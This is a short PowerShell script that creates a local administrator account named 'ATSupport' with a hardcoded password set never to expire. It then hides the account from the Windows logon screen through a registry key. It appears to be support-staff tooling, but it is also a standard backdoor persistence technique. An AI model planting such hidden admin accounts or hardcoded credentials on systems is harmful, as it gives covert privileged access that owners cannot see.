#Create Local Admin account  (hidden from user logon screen but enabled, no password expire date)

$Username = "ATSupport"
$Password = "Team@2020!"
$group = "Administrators"

$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$existing = $adsi.Children | Where-Object {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }

if ($null -eq $existing) {

Write-Host "Creating new local user $Username."
& NET USER $Username $Password /add /y /expires:never

Write-Host "Adding local user $Username to $group."
& NET LOCALGROUP $group $Username /add

}
else {
Write-Host "Setting password for existing local user $Username."
$existing.SetPassword($Password)
}

Write-Host "Ensuring password for $Username never expires."
& WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE

# hiding user account from logon screen

$path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
New-Item $path -Force | New-ItemProperty -Name $Username -Value 0 -PropertyType DWord -Force